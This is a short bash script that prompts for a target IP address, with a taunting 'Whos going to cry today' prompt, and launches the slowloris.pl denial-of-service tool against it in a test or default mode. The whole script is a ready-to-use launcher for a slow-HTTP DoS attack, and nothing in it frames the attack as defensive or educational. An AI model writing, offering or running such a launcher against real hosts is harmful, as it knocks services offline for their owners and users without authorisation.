#! /bin/bash

echo "###################### SLOW-LORIS ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo "CHOOSE ATTACK TYPE:"
echo "1- Test Mode"
echo "2- Default Mode"
echo
read -p 'Your choice: ' Fpointer
echo "################# STARTING THREADS ######################"
cd /usr/bin

case $Fpointer in

  1) ( slowloris.pl -dns $tarip -test
     )
  ;;

  2) ( slowloris.pl -dns $tarip
     )
  ;;

esac
